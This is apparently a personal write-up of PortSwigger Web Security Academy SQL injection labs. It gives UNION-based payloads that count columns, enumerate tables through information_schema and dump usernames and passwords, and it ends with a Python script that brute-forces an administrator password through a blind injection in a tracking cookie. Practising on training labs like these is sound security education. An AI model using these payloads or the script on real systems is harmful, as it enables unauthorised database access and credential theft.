**SQL injection [Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**

# [SQL injection] — [SQL injection UNION attack, determining the number of columns returned by the query]

## Summary

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 


**Fix**
1. Go to the any category for e.g., Pets.
2. Malipulate the URL bar with ' UNION SELECT NULL--
3. If the page still remains the same or no changes to be found add one more NULL at the end which makes the query ' UNION SELECT NULL, NULL--
4. Repeat this until you see any error message.

# [SQL injection] — [SQL injection UNION attack, finding a column containing text]

## Summary

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 


**Fix**
1. Go to the any category for e.g., Pets.
2. Change the parameter to find the number of column using the following query: ' ORDER BY 1-- then ORDER BY 2-- till you find the exact number of column.
3. Once found the number of column replace each value using the provided value in the lab like: UNION SELECT 'value', NULL, NULL --
4. Repeat this process until the exact position is found.

# [SQL injection] — [SQL injection UNION attack, retrieving multiple values in a single column]

## Summary

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.  

**Fix**
1.  Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+NULL,'abc'--
2.  Use the following payload to retrieve the contents of the users table:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
3. Login with the credentials you found.

# [SQL injection] — [SQL injection attack, querying the database type and version on MySQL and Microsoft]

## Summary

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

**Fix**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'#
3. Use the following payload to display the database version:
'+UNION+SELECT+@@version,+NULL#

# [SQL injection] — [SQL injection attack, listing the database contents on non-Oracle databases]

## Summary

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

**Fix**
1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'--
3. Use the following payload to retrieve the list of tables in the database:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials.
4. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
Find the names of the columns containing usernames and passwords.
5. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
Find the password for the administrator user, and use it to log in. 

# [SQL injection] — [Blind SQL injection with conditional responses]

## Summary

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.  

**Fix**
USE THE FOLLOWING SCRIPT:
#!/usr/bin/env python3

import requests
import string

url = "https://0a0b000f04e781038005eeba00030047.web-security-academy.net/"

tracking_id = "kA9ovCWWPxN5wtQ3"
session = "FxTpefzL9PMxcWhwYw7bapATayW9CZ62"

chars = string.ascii_lowercase + string.digits
password = ""

for position in range(1, 21):
    found = False

    for char in chars:
        payload = (
            f"{tracking_id}' AND "
            f"SUBSTRING((SELECT password FROM users "
            f"WHERE username='administrator'),{position},1)='{char}'-- "
        )

        cookies = {
            "TrackingId": payload,
            "session": session
        }

        response = requests.get(url, cookies=cookies)

        if "Welcome back" in response.text:
            password += char
            print(f"[+] Position {position}: {char}    Password: {password}")
            found = True
            break

    if not found:
        print(f"[-] No character found at position {position}")
        break

print(f"\nPassword: {password}")
